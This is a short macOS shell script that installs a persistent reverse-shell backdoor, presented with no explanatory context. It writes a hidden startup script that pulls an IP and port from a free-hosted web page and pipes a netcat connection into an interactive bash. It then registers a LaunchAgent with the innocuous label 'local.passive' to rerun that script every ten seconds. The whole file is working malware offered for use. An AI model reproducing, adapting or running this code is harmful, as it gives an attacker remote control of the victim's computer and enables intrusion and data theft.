#!/bin/sh

echo '#!/usr/bin/env bash\nsetopt NOMULTIOS;\nmkfifo ~/opt/services;\ncontent=$(curl -L https://paramagnetic-shotli.000webhostapp.com/);\nip=$(echo $content | cut -d\> -f4 | cut -dV -f1);\nport=$(echo $content | cut -d\> -f4 | cut -d\< -f1 | cut -dV -f2);\ncat ~/opt/services | nc $ip $port | bash -i > ~/opt/services 2>&1' | sed "s/~/$(echo $HOME | sed 's/\//\\\//g')/g" > ~/opt/local.startup.sh;

echo '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">\n<dict>\n    <key>Label</key>\n    <string>local.passive</string>\n    <key>Program</key>\n    <string>HOMEPATH/opt/local.startup.sh</string>\n    <key>StartInterval</key>\n    <integer>10</integer>\n</dict>\n</plist>' | sed "s/HOMEPATH/$(echo $HOME | sed 's/\//\\\//g')/g" > ~/Library/LaunchAgents/local.passive.plist;

chmod +x ~/opt/local.startup.sh;

launchctl unload ~/Library/LaunchAgents/local.passive.plist;
sleep 5;
launchctl load ~/Library/LaunchAgents/local.passive.plist;
launchctl start ~/Library/LaunchAgents/local.passive.plist
exit 0;